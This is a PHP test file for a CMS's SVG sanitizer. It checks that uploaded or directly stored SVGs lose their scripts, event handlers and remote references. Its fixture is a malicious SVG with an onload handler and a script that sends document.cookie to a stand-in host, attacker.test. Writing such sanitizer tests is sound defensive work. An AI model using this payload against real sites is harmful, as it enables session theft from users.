<?php

use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Laravix\Cms\Enums\SiteRole;
use Laravix\Cms\Models\Media;
use Laravix\Cms\Models\Setting;
use Laravix\Cms\Models\Site;
use Laravix\Cms\Models\User;
use Laravix\Cms\Support\SvgSanitizer;

const MALICIOUS_SVG = <<<'SVG'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="alert(1)">
    <script>fetch('https://attacker.test/?c='+document.cookie)</script>
    <image href="https://attacker.test/pixel.png" />
    <circle cx="50" cy="50" r="40" fill="red" />
</svg>
SVG;

beforeEach(function () {
    Storage::fake('public');

    $this->site = Site::factory()->create();
    Setting::create(['site_id' => $this->site->id, 'key' => 'allow_svg_uploads', 'value' => '1']);

    $this->editor = User::factory()->create();
    $this->editor->sites()->attach($this->site, ['role' => SiteRole::EDITOR->value]);
});

test('the sanitizer strips scripts, event handlers and remote references', function () {
    $clean = app(SvgSanitizer::class)->sanitize(MALICIOUS_SVG);

    expect($clean)->not->toContain('<script')
        ->and($clean)->not->toContain('onload')
        ->and($clean)->not->toContain('attacker.test')
        ->and($clean)->toContain('<circle');
});

test('the sanitizer replaces an unparsable document', function () {
    $clean = app(SvgSanitizer::class)->sanitize('this is not xml at all');

    expect($clean)->not->toContain('this is not xml');
});

test('an svg uploaded through the builder is sanitized on disk', function () {
    $this->actingAs($this->editor)
        ->post(route('builder.upload', $this->site), [
            'file' => UploadedFile::fake()->createWithContent('logo.svg', MALICIOUS_SVG),
        ])
        ->assertOk();

    $media = Media::where('site_id', $this->site->id)->sole();
    $stored = Storage::disk('public')->get($media->path);

    expect($stored)->not->toContain('<script')
        ->and($stored)->not->toContain('onload')
        ->and($stored)->not->toContain('attacker.test')
        ->and($stored)->toContain('<circle');
});

test('an svg created outside the builder is sanitized too', function () {
    Storage::disk('public')->put('media/direct.svg', MALICIOUS_SVG);

    Media::create([
        'site_id' => $this->site->id,
        'name' => 'direct.svg',
        'path' => 'media/direct.svg',
        'disk' => 'public',
        'mime_type' => 'image/svg+xml',
        'size' => strlen(MALICIOUS_SVG),
        'created_by' => $this->editor->id,
    ]);

    expect(Storage::disk('public')->get('media/direct.svg'))->not->toContain('<script');
});
